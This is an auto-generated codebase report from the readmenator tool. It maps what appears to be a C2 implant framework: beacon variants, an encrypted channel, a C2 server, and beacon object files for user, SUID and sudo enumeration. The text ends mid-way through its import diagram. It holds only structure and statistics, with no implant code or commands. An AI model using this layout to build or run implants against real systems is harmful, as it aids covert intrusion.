# Polyglot Codebase Knowledge Graph

> Generated offline by **readmenator**. 52 files, 1458 symbols, 400 imports. Supports C, C++, Python, Go, Rust, JS/TS, Java, C#, Shell, PHP, Dart, GDScript, Nim, ASM, Ruby, Swift, Kotlin, Scala, Lua, Elixir.
> No LLMs. No tokens. Pure static analysis. See more [here](https://github.com/grisuno/ReadMenator)

**Start here:** Statistics Dashboard for scope, God Nodes for blast radius, Architecture Reference for per-file API. Agents: prefer `readmenator-agent/INDEX.md` + `SYMBOLS.md`.

**Total Files Parsed:** 52 | **Total Symbols Extracted:** 1458 | **Total Imports:** 400
 | **Resolved Imports:** 43

<!-- ranking_model: v1.0 | weights: {ppr:0.45,auth:0.2,test:0.15,doc:0.1,fresh:0.1} | alpha:0.85 | commit:b3ca3bb | date:2026-07-18 -->


## Table of Contents

1. [Statistics Dashboard](#statistics-dashboard)
2. [Architectural Layers](#architectural-layers)
3. [Ranked Context](#ranked-context)
4. [God Nodes](#god-nodes)
5. [Community Analysis](#community-analysis)
6. [Surprising Connections](#surprising-connections)
7. [Suggested Questions](#suggested-questions)
8. [Taint Propagation Map](#taint-propagation-map)
9. [Hotspot Analysis](#hotspot-analysis)
10. [Change Impact Analysis](#change-impact-analysis)
11. [Suggested Linting Rules](#suggested-linting-rules)
12. [Orphans](#orphans)
13. [Query Recipes](#query-recipes)
14. [Structural Knowledge Map](#structural-knowledge-map)
15. [UML Class Diagram](#uml-class-diagram)
16. [Code Property Graph](#code-property-graph)
17. [Architecture Reference](#architecture-reference)
    - [C (29 files)](#c-29-files)
    - [H (11 files)](#h-11-files)
    - [PY (11 files)](#py-11-files)
    - [SH (1 files)](#sh-1-files)

---

## Statistics Dashboard

| Metric | Value |
|--------|-------|
| Total Files | 52 |
| Total Symbols | 1458 |
| Total Imports | 400 |
| Call Edges | 882 |
| Inheritance Edges | 0 |
| Languages | 4 |
| Avg Symbols/File | 28.0 |
| Avg Imports/File | 7.7 |
| Resolved Imports | 43 |

### Top Files by Import Count (Fan-Out)

| File | Imports | Symbols | Language |
|------|---------|---------|----------|
| `beacon5.c` | 31 | 94 | c |
| `beacon6.c` | 30 | 70 | c |
| `beacon_p2p.c` | 30 | 95 | c |
| `beacon3.c` | 29 | 66 | c |
| `gopher_beacon.c` | 26 | 65 | c |
| `gopher_beacon.c` | 26 | 65 | c |
| `beacon_common.c` | 24 | 51 | c |
| `test_c2_http_e2e.py` | 24 | 9 | py |
| `server.py` | 17 | 14 | py |
| `beacon.c` | 13 | 28 | c |

### Top Files by Imported-By Count (Fan-In)

| File | Imported By | Symbols | Language |
|------|-------------|---------|----------|
| `cJSON.h` | 12 | 38 | h |
| `aes.h` | 10 | 21 | h |
| `beacon.h` | 7 | 13 | h |

---

## Architectural Layers

Auto-detected from path patterns, naming conventions, and imported frameworks.

| Layer | Files |
|-------|-------|
| utility | 38 |
| testing | 8 |
| infrastructure | 4 |
| presentation | 2 |

### utility

- `aes.c` (c, 44 symbols)
- `aes.h` (h, 21 symbols)
- `app.py` (py, 0 symbols)
- `beacon.h` (h, 13 symbols)
- `beacon3.c` (c, 66 symbols)
- `beacon5.c` (c, 94 symbols)
- `beacon6.c` (c, 70 symbols)
- `beacon_p2p.c` (c, 95 symbols)
- `beacon.c` (c, 19 symbols)
- `gopher_beacon.c` (c, 65 symbols)
- `beacon.c` (c, 28 symbols)
- `beacon.c` (c, 22 symbols)
- `bof.c` (c, 2 symbols)
- `bof.c` (c, 4 symbols)
- `cat.c` (c, 13 symbols)
- *... and 23 more*

### presentation

- `beacon_api.h` (h, 14 symbols)
- `bof.c` (c, 18 symbols)

### infrastructure

- `config.c` (c, 25 symbols)
- `config.h` (h, 21 symbols)
- `config_py.py` (py, 2 symbols)
- `config_harness.c` (c, 4 symbols)

### testing

- `crypto_harness.c` (c, 6 symbols)
- `test_beacon_build.py` (py, 7 symbols)
- `test_bof_compile.py` (py, 7 symbols)
- `test_c2_http_e2e.py` (py, 9 symbols)
- `test_c2_server.py` (py, 11 symbols)
- `test_config.py` (py, 9 symbols)
- `test_crypto.py` (py, 8 symbols)
- `test_install_deploy.py` (py, 8 symbols)

---

## Ranked Context

Files ranked by composite score for the current query context. The ranking combines Personalized PageRank (query relevance), global authority, test coverage, documentation coverage, and code freshness. Model: v1.0.

| Rank | File | Composite | PPR | Authority | Test | Doc |
|------|------|-----------|-----|-----------|------|-----|
| 1 | `config_py.py` | 0.1270 | 0.0416 | 0.0416 | 0.00 | 1.00 |
| 2 | `server.py` | 0.1123 | 0.0299 | 0.0299 | 0.00 | 0.93 |
| 3 | `bof.c` | 0.1105 | 0.0162 | 0.0162 | 0.00 | 1.00 |
| 4 | `app.py` | 0.1000 | 0.0000 | 0.0000 | 0.00 | 1.00 |
| 5 | `install.sh` | 0.1000 | 0.0000 | 0.0000 | 0.00 | 1.00 |
| 6 | `aes.h` | 0.0718 | 0.0738 | 0.0738 | 0.00 | 0.24 |
| 7 | `config.h` | 0.0645 | 0.0772 | 0.0772 | 0.00 | 0.14 |
| 8 | `beacon_common.h` | 0.0636 | 0.0395 | 0.0395 | 0.00 | 0.38 |
| 9 | `cJSON.h` | 0.0622 | 0.0876 | 0.0876 | 0.00 | 0.05 |
| 10 | `beacon.h` | 0.0604 | 0.0573 | 0.0573 | 0.00 | 0.23 |

---

## God Nodes

Most architecturally central files ranked by combined import/export degree and symbol richness.

| File | Score | Connections | PageRank |
|------|-------|-------------|----------|
| `cJSON.h` | 27.8 | | 0.0876 |
| `aes.h` | 22.1 | | 0.0738 |
| `cJSON.c` | 18.0 | | 0.0000 |
| `cJSON.c` | 16.0 | | 0.0000 |
| `beacon_common.h` | 15.8 | | 0.0395 |
| `beacon_p2p.c` | 15.5 | | 0.0000 |
| `beacon5.c` | 15.4 | | 0.0000 |
| `beacon.h` | 15.3 | | 0.0573 |
| `beacon_common.c` | 15.1 | | 0.0000 |
| `syscalls.h` | 13.9 | | 0.0000 |

---

## Community Analysis

Files grouped by import-based community detection. Cohesion measures how tightly connected each community is internally.

### root (Cohesion: 0.89)

**19 files** in this community:

- `aes.c` (c, 44 symbols)
- `aes.h` (h, 21 symbols)
- `beacon.h` (h, 13 symbols)
- `beacon3.c` (c, 66 symbols)
- `beacon5.c` (c, 94 symbols)
- `beacon6.c` (c, 70 symbols)
- `beacon_p2p.c` (c, 95 symbols)
- `beacon.c` (c, 19 symbols)
- `gopher_beacon.c` (c, 65 symbols)
- `beacon.c` (c, 28 symbols)
- `beacon.c` (c, 22 symbols)
- `bof.c` (c, 2 symbols)
- `cJSON.c` (c, 140 symbols)
- `cJSON.h` (h, 38 symbols)
- `gopher_beacon.c` (c, 65 symbols)
- `beacon_common.c` (c, 51 symbols)
- `beacon_common.h` (h, 58 symbols)
- `cJSON.c` (c, 140 symbols)
- `cJSON.h` (h, 38 symbols)

### bof/include (Cohesion: 1.00)

**7 files** in this community:

- `bof.c` (c, 4 symbols)
- `beacon_api.h` (h, 14 symbols)
- `syscalls.h` (h, 39 symbols)
- `bof.c` (c, 5 symbols)
- `bof.c` (c, 18 symbols)
- `bof.c` (c, 5 symbols)
- `bof.c` (c, 3 symbols)

### c2 (Cohesion: 1.00)

**3 files** in this community:

- `server.py` (py, 14 symbols)
- `config_py.py` (py, 2 symbols)
- `test_c2_server.py` (py, 11 symbols)

### include (Cohesion: 0.40)

**3 files** in this community:

- `aes.c` (c, 44 symbols)
- `aes.h` (h, 21 symbols)
- `aes_cfb.c` (c, 6 symbols)

### include (Cohesion: 1.00)

**2 files** in this community:

- `aes_cfb.h` (h, 3 symbols)
- `crypto_harness.c` (c, 6 symbols)

### include (Cohesion: 0.67)

**3 files** in this community:

- `config.c` (c, 25 symbols)
- `config.h` (h, 21 symbols)
- `config_harness.c` (c, 4 symbols)

---

## Surprising Connections

Files in different communities connected through 3+ indirect hops.

- `bof.c` <-> `config.c` (7 hops, across 2 communities)
- `bof.c` <-> `config_harness.c` (7 hops, across 2 communities)
- `beacon.h` <-> `config.c` (6 hops, across 2 communities)
- `beacon.h` <-> `config_harness.c` (6 hops, across 2 communities)
- `bof.c` <-> `config.h` (6 hops, across 2 communities)

---

## Suggested Questions

Auto-generated exploration prompts based on graph structure:

- What does cJSON.h depend on, and what depends on it? (12 connections)
- What does aes.h depend on, and what depends on it? (10 connections)
- What does cJSON.c depend on, and what depends on it? (2 connections)
- How are the 19 files in 'root' related to each other?
- Why are bof.c and config.c connected through 7 hops across 2 communities?

---

## Taint Propagation Map

Taint analysis traces how dangerous imports propagate through the codebase via transitive dependencies. Source files import dangerous modules directly; sink files receive the danger indirectly.

**Taint Sources:** 5 | **Taint Sinks:** 5 | **Propagation Paths:** 5

- `test_beacon_build.py` imports `subprocess` (0 hop to `test_beacon_build.py`) [high]
  Path: test_beacon_build.py
- `test_bof_compile.py` imports `subprocess` (0 hop to `test_bof_compile.py`) [high]
  Path: test_bof_compile.py
- `test_config.py` imports `subprocess` (0 hop to `test_config.py`) [high]
  Path: test_config.py
- `test_crypto.py` imports `subprocess` (0 hop to `test_crypto.py`) [high]
  Path: test_crypto.py
- `test_install_deploy.py` imports `subprocess` (0 hop to `test_install_deploy.py`) [high]
  Path: test_install_deploy.py

---

## Hotspot Analysis

Files ranked by combined complexity (symbol count) and centrality (connection count). High-scoring files are architecturally critical and may need refactoring attention.

| File | Complexity | Centrality | Combined | Symbols | Connections |
|------|-----------|------------|----------|---------|-------------|
| `config_py.py` | 0.014 | 0.176 | 0.112 | 2 | 6 |
| `server.py` | 0.100 | 0.559 | 0.375 | 14 | 19 |
| `bof.c` | 0.014 | 0.059 | 0.041 | 2 | 2 |
| `app.py` | 0.000 | 0.029 | 0.018 | 0 | 1 |
| `install.sh` | 0.000 | 0.000 | 0.000 | 0 | 0 |
| `aes.h` | 0.150 | 0.529 | 0.378 | 21 | 18 |
| `config.h` | 0.150 | 0.147 | 0.148 | 21 | 5 |
| `beacon_common.h` | 0.414 | 0.265 | 0.325 | 58 | 9 |
| `cJSON.h` | 0.271 | 0.559 | 0.444 | 38 | 19 |
| `beacon.h` | 0.093 | 0.441 | 0.302 | 13 | 15 |
| `beacon5.c` | 0.671 | 1.000 | 0.869 | 94 | 34 |
| `beacon_p2p.c` | 0.679 | 0.971 | 0.854 | 95 | 33 |
| `beacon6.c` | 0.500 | 0.971 | 0.782 | 70 | 33 |
| `beacon3.c` | 0.471 | 0.941 | 0.753 | 66 | 32 |
| `gopher_beacon.c` | 0.464 | 0.853 | 0.698 | 65 | 29 |

---

## Change Impact Analysis

Files sorted by how many other files would be affected if they changed. High-impact files should be changed with caution.

| File | Direct Dependents | Transitive Dependents | Total Impact |
|------|------------------|----------------------|--------------|
| `config.h` | 3 | 4 | 7 |
| `aes.h` | 6 | 0 | 6 |
| `beacon.h` | 6 | 0 | 6 |
| `cJSON.h` | 6 | 0 | 6 |
| `beacon_api.h` | 5 | 0 | 5 |
| `syscalls.h` | 5 | 0 | 5 |
| `beacon_common.h` | 4 | 0 | 4 |
| `aes.h` | 3 | 0 | 3 |
| `cJSON.h` | 2 | 0 | 2 |
| `config_py.py` | 1 | 1 | 2 |
| `server.py` | 1 | 0 | 1 |
| `aes_cfb.h` | 1 | 0 | 1 |
| `aes.c` | 0 | 0 | 0 |
| `app.py` | 0 | 0 | 0 |
| `beacon3.c` | 0 | 0 | 0 |

---

## Suggested Linting Rules

Automatically suggested linting and security rules based on patterns detected in the codebase. These can be exported as Semgrep rules using the `--export-rules` flag.

| Rule ID | Severity | Description | Language | Matches |
|---------|----------|-------------|----------|---------|
| `RM001` | info | Large number of functions in c: 895 total | c | 895 |
| `RM002` | info | Large number of functions in h: 82 total | h | 82 |
| `RM003` | info | Large number of functions in py: 79 total | py | 79 |
| `RM004` | info | Print statement found (consider logging instead) | python | 62 |

---

## Orphans

Files with no documentation or low connectivity. These are candidates for documentation investment or cleanup.

- `beacon.c` (22 symbols, no doc)
- `bof.c` (5 symbols, no doc)
- `gopher_c2.py` (5 symbols, no doc)
- `config_harness.c` (4 symbols, no doc)

---

## Query Recipes

Example queries you can run against this knowledge base using the ranking engine:

```
# Find files most relevant to a concept
readmenator query "Where is the import resolver implemented?"

# Rank files by relevance to a topic
readmenator query "How does documentation generation work?"

# Explain why a file ranks highly
readmenator query "explain readmenator/_documentation.py"

# Trace dependency paths with ranked context
readmenator query "path from CLI to exporter"
```

The ranking model uses the following signals:

- **Personalized PageRank** (45% weight): query-specific relevance via seed propagation
- **Global Authority** (20% weight): structural importance via standard PageRank
- **Test Coverage** (15% weight): fraction of symbols referenced in test files
- **Doc Coverage** (10% weight): presence of docstrings and file-level docs
- **Freshness** (10% weight): recent modification activity

Results include score decomposition and justification paths for each ranked item.

---

## Structural Knowledge Map

```mermaid
graph TD
    classDef mod fill:#1e1e1e,stroke:#ff6666,stroke-width:2px,color:#fff;
    classDef cls fill:#2d2d2d,stroke:#4ec9b0,stroke-width:2px,color:#fff;
    classDef fn fill:#333,stroke:#dcdcaa,stroke-width:1px,color:#dcdcaa;
    classDef ext fill:#111,stroke:#666,stroke-dasharray:5 5,color:#aaa;
    subgraph community_0 ["root"]
    beacon5_c["beacon5.c (c)"]
    class beacon5_c mod;
    beacon5_c_MemoryStruct["MemoryStruct"]
    class beacon5_c_MemoryStruct cls;
    beacon5_c --> beacon5_c_MemoryStruct
    beacon5_c_peer_t["peer_t"]
    class beacon5_c_peer_t cls;
    beacon5_c --> beacon5_c_peer_t
    beacon5_c_mesh_msg_t["mesh_msg_t"]
    class beacon5_c_mesh_msg_t cls;
    beacon5_c --> beacon5_c_mesh_msg_t
    beacon5_c_Trampoline["Trampoline"]
    class beacon5_c_Trampoline cls;
    beacon5_c --> beacon5_c_Trampoline
    beacon5_c_SymbolResolver["SymbolResolver"]
    class beacon5_c_SymbolResolver cls;
    beacon5_c --> beacon5_c_SymbolResolver
    beacon_p2p_c["beacon_p2p.c (c)"]
    class beacon_p2p_c mod;
    beacon6_c["beacon6.c (c)"]
    class beacon6_c mod;
    beacon3_c["beacon3.c (c)"]
    class beacon3_c mod;
    gopher_beacon_c["gopher_beacon.c (c)"]
    class gopher_beacon_c mod;
    include_beacon_common_c["beacon_common.c (c)"]
    class include_beacon_common_c mod;
    beacons_v1_gopher_beacon_c["gopher_beacon.c (c)"]
    class beacons_v1_gopher_beacon_c mod;
    tests_test_c2_http_e2e_py["test_c2_http_e2e.py (py)"]
    class tests_test_c2_http_e2e_py mod;
    end
    subgraph community_2 ["c2"]
    c2_server_py["server.py (py)"]
    class c2_server_py mod;
    beacons_v2_beacon_c["beacon.c (c)"]
    class beacons_v2_beacon_c mod;
    cJSON_c["cJSON.c (c)"]
    class cJSON_c mod;
    include_cJSON_c["cJSON.c (c)"]
    class include_cJSON_c mod;
    beacons_v3_beacon_c["beacon.c (c)"]
    class beacons_v3_beacon_c mod;
    beacons_v1_beacon_c["beacon.c (c)"]
    class beacons_v1_beacon_c mod;
    tests_test_c2_server_py["test_c2_server.py (py)"]
    class tests_test_c2_server_py mod;
    gopher_c2_py["gopher_c2.py (py)"]
    class gopher_c2_py mod;
    end
    subgraph community_5 ["include"]
    include_config_c["config.c (c)"]
    class include_config_c mod;
    tests_test_crypto_py["test_crypto.py (py)"]
    class tests_test_crypto_py mod;
    tests_test_config_py["test_config.py (py)"]
    class tests_test_config_py mod;
    tests_test_install_deploy_py["test_install_deploy.py (py)"]
    class tests_test_install_deploy_py mod;
    include_beacon_common_h["beacon_common.h (h)"]
    class include_beacon_common_h mod;
    tests_test_beacon_build_py["test_beacon_build.py (py)"]
    class tests_test_beacon_build_py mod;
    tests_test_bof_compile_py["test_bof_compile.py (py)"]
    class tests_test_bof_compile_py mod;
    end
    subgraph community_4 ["include"]
    tests_crypto_harness_c["crypto_harness.c (c)"]
    class tests_crypto_harness_c mod;
    tests_config_harness_c["config_harness.c (c)"]
    class tests_config_harness_c mod;
    include_config_py_py["config_py.py (py)"]
    class include_config_py_py mod;
    end
    subgraph community_1 ["bof/include"]
    bof_suid_enum_bof_c["bof.c (c)"]
    class bof_suid_enum_bof_c mod;
    end
    subgraph community_3 ["include"]
    include_aes_cfb_c["aes_cfb.c (c)"]
    class include_aes_cfb_c mod;
    bof_is_sudo_bof_c["bof.c (c)"]
    class bof_is_sudo_bof_c mod;
    bof_userenum_bof_c["bof.c (c)"]
    class bof_userenum_bof_c mod;
    bof_cat_bof_c["bof.c (c)"]
    class bof_cat_bof_c mod;
    bof_whoami_bof_c["bof.c (c)"]
    class bof_whoami_bof_c mod;
    aes_c["aes.c (c)"]
    class aes_c mod;
    include_aes_c["aes.c (c)"]
    class include_aes_c mod;
    bof_include_beacon_api_h["beacon_api.h (h)"]
    class bof_include_beacon_api_h mod;
    aes_h["aes.h (h)"]
    class aes_h mod;
    include_aes_h["aes.h (h)"]
    class include_aes_h mod;
    include_config_h["config.h (h)"]
    class include_config_h mod;
    beacon_h["beacon.h (h)"]
    class beacon_h mod;
    include_beacon_h["beacon.h (h)"]
    class include_beacon_h mod;
    bof_c["bof.c (c)"]
    class bof_c mod;
    bof_include_syscalls_h["syscalls.h (h)"]
    class bof_include_syscalls_h mod;
    cJSON_h["cJSON.h (h)"]
    class cJSON_h mod;
    include_cJSON_h["cJSON.h (h)"]
    class include_cJSON_h mod;
    include_aes_cfb_h["aes_cfb.h (h)"]
    class include_aes_cfb_h mod;
    app_py["app.py (py)"]
    class app_py mod;
    bof_is_sudo_is_sudo_c["is_sudo.c (c)"]
    class bof_is_sudo_is_sudo_c mod;
    issudo_c["issudo.c (c)"]
    class issudo_c mod;
    bof_whoami_whoami_c["whoami.c (c)"]
    class bof_whoami_whoami_c mod;
    bof_userenum_userenum_c["userenum.c (c)"]
    class bof_userenum_userenum_c mod;
    bof_cat_cat_c["cat.c (c)"]
    class bof_cat_cat_c mod;
    install_sh["install.sh (sh)"]
    class install_sh mod;
    end
    aes_c -- resolved_imports --> aes_h
    beacon3_c -- resolved_imports --> beacon_h
    beacon3_c -- resolved_imports --> aes_h
    beacon3_c -- resolved_imports --> cJSON_h
    beacon5_c -- resolved_imports --> beacon_h
    beacon5_c -- resolved_imports --> aes_h
    beacon5_c -- resolved_imports --> cJSON_h
    beacon6_c -- resolved_imports --> beacon_h
    beacon6_c -- resolved_imports --> aes_h
    beacon6_c -- resolved_imports --> cJSON_h
    beacon_p2p_c -- resolved_imports --> beacon_h
    beacon_p2p_c -- resolved_imports --> aes_h
    beacon_p2p_c -- resolved_imports --> cJSON_h
    beacons_v1_beacon_c -- resolved_imports --> include_beacon_common_h
    beacons_v2_beacon_c -- resolved_imports --> include_beacon_common_h
    beacons_v3_beacon_c -- resolved_imports --> include_beacon_common_h
    bof_cat_bof_c -- resolved_imports --> bof_include_beacon_api_h
    bof_cat_bof_c -- resolved_imports --> bof_include_syscalls_h
    bof_is_sudo_bof_c -- resolved_imports --> bof_include_beacon_api_h
    bof_is_sudo_bof_c -- resolved_imports --> bof_include_syscalls_h
    bof_suid_enum_bof_c -- resolved_imports --> bof_include_beacon_api_h
    bof_suid_enum_bof_c -- resolved_imports --> bof_include_syscalls_h
    bof_userenum_bof_c -- resolved_imports --> bof_include_beacon_api_h
    bof_userenum_bof_c -- resolved_imports --> bof_include_syscalls_h
    bof_whoami_bof_c -- resolved_imports --> bof_include_beacon_api_h
    bof_whoami_bof_c -- resolved_imports --> bof_include_syscalls_h
    bof_c -- resolved_imports --> beacon_h
    c2_server_py -- resolved_imports --> include_config_py_py
    cJSON_c -- resolved_imports --> cJSON_h
    gopher_beacon_c -- resolved_imports --> beacon_h
    gopher_beacon_c -- resolved_imports --> aes_h
    gopher_beacon_c -- resolved_imports --> cJSON_h
    include_aes_c -- resolved_imports --> include_aes_h
    include_aes_cfb_c -- resolved_imports --> include_aes_h
    include_beacon_common_c -- resolved_imports --> include_beacon_common_h
    include_beacon_common_c -- resolved_imports --> include_aes_h
    include_beacon_common_c -- resolved_imports --> include_cJSON_h
    include_beacon_common_h -- resolved_imports --> include_config_h
    include_cJSON_c -- resolved_imports --> include_cJSON_h
    include_config_c -- resolved_imports --> include_config_h
    tests_config_harness_c -- resolved_imports --> include_config_h
    tests_crypto_harness_c -- resolved_imports --> include_aes_cfb_h
    tests_test_c2_server_py -- resolved_imports --> c2_server_py
    ext_aes_h["aes.h"]
    class ext_aes_h ext;
    aes_c -.->|imports| ext_aes_h
    ext_string_h["string.h"]
    class ext_string_h ext;
    aes_c -.->|imports| ext_string_h
    ext_stdint_h["stdint.h"]
    class ext_stdint_h ext;
    aes_h -.->|imports| ext_stdint_h
    ext_stddef_h["stddef.h"]
    class ext_stddef_h ext;
    aes_h -.->|imports| ext_stddef_h
    ext_os["os"]
    class ext_os ext;
    app_py -.->|imports| ext_os
    beacon_h -.->|imports| ext_stdint_h
    ext_stdarg_h["stdarg.h"]
    class ext_stdarg_h ext;
    beacon_h -.->|imports| ext_stdarg_h
    ext_stdio_h["stdio.h"]
    class ext_stdio_h ext;
    beacon3_c -.->|imports| ext_stdio_h
    ext_stdlib_h["stdlib.h"]
    class ext_stdlib_h ext;
    beacon3_c -.->|imports| ext_stdlib_h
    beacon3_c -.->|imports| ext_string_h
    ext_unistd_h["unistd.h"]
    class ext_unistd_h ext;
    beacon3_c -.->|imports| ext_unistd_h
    ext_time_h["time.h"]
    class ext_time_h ext;
    beacon3_c -.->|imports| ext_time_h
    ext_sys_types_h["types.h"]
    class ext_sys_types_h ext;
    beacon3_c -.->|imports| ext_sys_types_h
    ext_sys_socket_h["socket.h"]
    class ext_sys_socket_h ext;
    beacon3_c -.->|imports| ext_sys_socket_h
    ext_netinet_in_h["in.h"]
    class ext_netinet_in_h ext;
    beacon3_c -.->|imports| ext_netinet_in_h
    ext_arpa_inet_h["inet.h"]
    class ext_arpa_inet_h ext;
    beacon3_c -.->|imports| ext_arpa_inet_h
    ext_net_if_h["if.h"]
    class ext_net_if_h ext;
    beacon3_c -.->|imports| ext_net_if_h
    ext_sys_ioctl_h["ioctl.h"]
    class ext_sys_ioctl_h ext;
    beacon3_c -.->|imports| ext_sys_ioctl_h
    ext_pwd_h["pwd.h"]
    class ext_pwd_h ext;
    beacon3_c -.->|imports| ext_pwd_h
    ext_errno_h["errno.h"]
    class ext_errno_h ext;
    beacon3_c -.->|imports| ext_errno_h
    ext_openssl_buffer_h["buffer.h"]
    class ext_openssl_buffer_h ext;
    beacon3_c -.->|imports| ext_openssl_buffer_h
    ext_curl_curl_h["curl.h"]
    class ext_curl_curl_h ext;
    beacon3_c -.->|imports| ext_curl_curl_h
    ext_openssl_rand_h["rand.h"]
    class ext_openssl_rand_h ext;
    beacon3_c -.->|imports| ext_openssl_rand_h
    ext_openssl_bio_h["bio.h"]
    class ext_openssl_bio_h ext;
    beacon3_c -.->|imports| ext_openssl_bio_h
    ext_openssl_evp_h["evp.h"]
    class ext_openssl_evp_h ext;
    beacon3_c -.->|imports| ext_openssl_evp_h
    ext_sys_mman_h["mman.h"]
    class ext_sys_mman_h ext;
    beacon3_c -.->|imports| ext_sys_mman_h
    ext_elf_h["elf.h"]
    class ext_elf_h ext;
    beacon3_c -.->|imports| ext_elf_h
    ext_dlfcn_h["dlfcn.h"]
    class ext_dlfcn_h ext;
    beacon3_c -.->|imports| ext_dlfcn_h
    ext_fcntl_h["fcntl.h"]
    class ext_fcntl_h ext;
    beacon3_c -.->|imports| ext_fcntl_h
    beacon3_c -.->|imports| ext_stdint_h
    ext_sys_wait_h["wait.h"]
    class ext_sys_wait_h ext;
    beacon3_c -.->|imports| ext_sys_wait_h
    beacon3_c -.->|imports| ext_stdarg_h
    ext_netdb_h["netdb.h"]
    class ext_netdb_h ext;
    beacon3_c -.->|imports| ext_netdb_h
    ext_beacon_h["beacon.h"]
    class ext_beacon_h ext;
    beacon3_c -.->|imports| ext_beacon_h
    beacon3_c -.->|imports| ext_aes_h
    ext_cJSON_h["cJSON.h"]
    class ext_cJSON_h ext;
    beacon3_c -.->|imports| ext_cJSON_h
    beacon5_c -.->|imports| ext_stdio_h
    beacon5_c -.->|imports| ext_stdlib_h
    beacon5_c -.->|imports| ext_string_h
    beacon5_c -.->|imports| ext_unistd_h
    beacon5_c -.->|imports| ext_time_h
    beacon5_c -.->|imports| ext_sys_types_h
    beacon5_c -.->|imports| ext_sys_socket_h
    beacon5_c -.->|imports| ext_netinet_in_h
    beacon5_c -.->|imports| ext_arpa_inet_h
    beacon5_c -.->|imports| ext_net_if_h
    beacon5_c -.->|imports| ext_sys_ioctl_h
    beacon5_c -.->|imports| ext_pwd_h
    beacon5_c -.->|imports| ext_errno_h
    beacon5_c -.->|imports| ext_openssl_buffer_h
    beacon5_c -.->|imports| ext_curl_curl_h
    beacon5_c -.->|imports| ext_openssl_rand_h
    beacon5_c -.->|imports| ext_openssl_bio_h
    beacon5_c -.->|imports| ext_openssl_evp_h
    beacon5_c -.->|imports| ext_sys_mman_h
    beacon5_c -.->|imports| ext_elf_h
    beacon5_c -.->|imports| ext_dlfcn_h
    beacon5_c -.->|imports| ext_fcntl_h
    beacon5_c -.->|imports| ext_stdint_h
    beacon5_c -.->|imports| ext_sys_wait_h
    beacon5_c -.->|imports| ext_stdarg_h
    beacon5_c -.->|imports| ext_netdb_h
    ext_pthread_h["pthread.h"]
    class ext_pthread_h ext;
    beacon5_c -.->|imports| ext_pthread_h
    ext_sys_select_h["select.h"]
    class ext_sys_select_h ext;
    beacon5_c -.->|imports| ext_sys_select_h
    beacon5_c -.->|imports| ext_beacon_h
    beacon5_c -.->|imports| ext_aes_h
    beacon5_c -.->|imports| ext_cJSON_h
    beacon6_c -.->|imports| ext_stdio_h
    beacon6_c -.->|imports| ext_stdlib_h
    beacon6_c -.->|imports| ext_string_h
    beacon6_c -.->|imports| ext_unistd_h
    beacon6_c -.->|imports| ext_time_h
    beacon6_c -.->|imports| ext_sys_types_h
    beacon6_c -.->|imports| ext_sys_socket_h
    beacon6_c -.->|imports| ext_netinet_in_h
    beacon6_c -.->|imports| ext_arpa_inet_h
    beacon6_c -.->|imports| ext_net_if_h
    beacon6_c -.->|imports| ext_sys_ioctl_h
    beacon6_c -.->|imports| ext_pwd_h
    beacon6_c -.->|imports| ext_errno_h
    beacon6_c -.->|imports| ext_openssl_buffer_h
    beacon6_c -.->|imports| ext_curl_curl_h
    beacon6_c -.->|imports| ext_openssl_rand_h
    beacon6_c -.->|imports| ext_openssl_bio_h
    beacon6_c -.->|imports| ext_openssl_evp_h
    beacon6_c -.->|imports| ext_sys_mman_h
    beacon6_c -.->|imports| ext_elf_h
    beacon6_c -.->|imports| ext_dlfcn_h
    beacon6_c -.->|imports| ext_fcntl_h
    beacon6_c -.->|imports| ext_stdint_h
    beacon6_c -.->|imports| ext_sys_wait_h
    beacon6_c -.->|imports| ext_stdarg_h
    beacon6_c -.->|imports| ext_netdb_h
    ext_poll_h["poll.h"]
    class ext_poll_h ext;
    beacon6_c -.->|imports| ext_poll_h
    beacon6_c -.->|imports| ext_beacon_h
    beacon6_c -.->|imports| ext_aes_h
    beacon6_c -.->|imports| ext_cJSON_h
    beacon_p2p_c -.->|imports| ext_stdio_h
    beacon_p2p_c -.->|imports| ext_stdlib_h
    beacon_p2p_c -.->|imports| ext_string_h
    beacon_p2p_c -.->|imports| ext_unistd_h
    beacon_p2p_c -.->|imports| ext_time_h
    beacon_p2p_c -.->|imports| ext_sys_types_h
    beacon_p2p_c -.->|imports| ext_sys_socket_h
    beacon_p2p_c -.->|imports| ext_netinet_in_h
    beacon_p2p_c -.->|imports| ext_arpa_inet_h
    beacon_p2p_c -.->|imports| ext_net_if_h
    beacon_p2p_c -.->|imports| ext_sys_ioctl_h
    beacon_p2p_c -.->|imports| ext_pwd_h
    beacon_p2p_c -.->|imports| ext_errno_h
    beacon_p2p_c -.->|imports| ext_openssl_buffer_h
    beacon_p2p_c -.->|imports| ext_curl_curl_h
    beacon_p2p_c -.->|imports| ext_openssl_rand_h
    beacon_p2p_c -.->|imports| ext_openssl_bio_h
    beacon_p2p_c -.->|imports| ext_openssl_evp_h
    beacon_p2p_c -.->|imports| ext_sys_mman_h
    beacon_p2p_c -.->|imports| ext_elf_h
    beacon_p2p_c -.->|imports| ext_dlfcn_h
    beacon_p2p_c -.->|imports| ext_fcntl_h
    beacon_p2p_c -.->|imports| ext_stdint_h
    beacon_p2p_c -.->|imports| ext_sys_wait_h
    beacon_p2p_c -.->|imports| ext_stdarg_h
    beacon_p2p_c -.->|imports| ext_netdb_h
    beacon_p2p_c -.->|imports| ext_pthread_h
    beacon_p2p_c -.->|imports| ext_beacon_h
    beacon_p2p_c -.->|imports| ext_aes_h
    beacon_p2p_c -.->|imports| ext_cJSON_h
    beacons_v1_beacon_c -.->|imports| ext_stdio_h
    beacons_v1_beacon_c -.->|imports| ext_stdlib_h
    beacons_v1_beacon_c -.->|imports| ext_string_h
    beacons_v1_beacon_c -.->|imports| ext_unistd_h
    beacons_v1_beacon_c -.->|imports| ext_time_h
    beacons_v1_beacon_c -.->|imports| ext_pwd_h
    beacons_v1_beacon_c -.->|imports| ext_openssl_rand_h
    ext_beacon_common_h["beacon_common.h"]
    class ext_beacon_common_h ext;
    beacons_v1_beacon_c -.->|imports| ext_beacon_common_h
    beacons_v1_beacon_c -.->|imports| ext_cJSON_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_stdio_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_stdlib_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_string_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_unistd_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_time_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_sys_types_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_sys_socket_h
